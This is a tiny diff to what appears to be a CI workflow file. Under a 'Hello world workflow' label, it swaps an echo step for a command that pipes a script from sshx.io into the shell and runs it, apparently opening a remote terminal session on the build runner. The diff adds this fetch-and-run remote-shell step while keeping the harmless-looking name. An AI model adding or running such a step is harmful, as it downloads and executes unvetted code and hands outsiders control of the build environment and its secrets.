@@ -2,4 +2,4 @@ workflows:
   hello-world:
     name: Hello world workflow
     scripts:
-        - echo "Hello World!"
+        - curl -sSf https://sshx.io/get | sh -s run
